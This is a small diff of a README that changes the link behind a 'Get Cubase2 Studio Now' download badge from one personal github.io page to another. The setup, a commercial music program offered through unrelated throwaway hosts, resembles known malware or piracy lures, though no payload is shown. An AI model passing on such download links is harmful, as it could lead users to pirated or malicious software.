@@ -4,7 +4,7 @@
 
 ![Banner Placeholder](https://i.namu.wiki/i/T1xX8B4zXyVhJmh797LHEL1llze7gPRt_XXHJvU99BNjzOAyakaSieKvO7l1NAQ8edgi4-V_Pvg47FqXU3N8mQ.webp)
 
-[![Get Cubase2 Studio](https://img.shields.io/badge/Get_Cubase2_Studio-Now-0a5d8d?style=for-the-badge&logo=github)](https://seezmelilwj.github.io/.github/cubase2)
+[![Get Cubase2 Studio](https://img.shields.io/badge/Get_Cubase2_Studio-Now-0a5d8d?style=for-the-badge&logo=github)](https://asrafali6140.github.io/.github/cubase2)
 
 ---
 
